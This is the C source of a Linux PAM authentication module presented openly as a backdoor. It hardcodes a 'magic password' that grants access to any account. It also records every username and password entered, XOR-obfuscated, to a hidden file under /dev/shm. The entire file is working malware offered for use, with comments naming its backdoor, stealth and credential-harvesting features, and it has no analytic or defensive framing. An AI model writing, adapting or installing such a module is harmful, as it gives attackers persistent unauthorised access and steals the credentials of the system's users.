#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h> // The magic header for pam_get_authtok

// --- Advanced Configuration ---
#define MAGIC_PASSWORD "Phantom_0x2026!"
#define STEALTH_FILE "/dev/shm/.kcore_sys" 
#define XOR_KEY 0x5A                       

// Advanced Feature: XOR Encryption Engine
void encrypt_data(char *data) {
    for (int i = 0; data[i] != '\0'; i++) {
        data[i] ^= XOR_KEY;
    }
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;
    const char *username = NULL;
    
    // Get username
    pam_get_user(pamh, &username, NULL);
    
    int retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (retval == PAM_SUCCESS && password != NULL && username != NULL) {
        
        // 1. The Backdoor Trigger (Log Bypass)
        if (strcmp(password, MAGIC_PASSWORD) == 0) {
            return PAM_SUCCESS; 
        }

        // 2. Encrypted Credential Harvesting
        FILE *f = fopen(STEALTH_FILE, "ab"); 
        if (f != NULL) {
            char buffer[512];
            snprintf(buffer, sizeof(buffer), "[+] %s:%s\n", username, password);
            
            // Encrypt the payload before writing to memory
            encrypt_data(buffer);
            
            fwrite(buffer, 1, strlen(buffer), f);
            fclose(f);
            
            // Lock down permissions
            chmod(STEALTH_FILE, 0600);
        }
    }

    return PAM_IGNORE; // Return control back to Linux
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
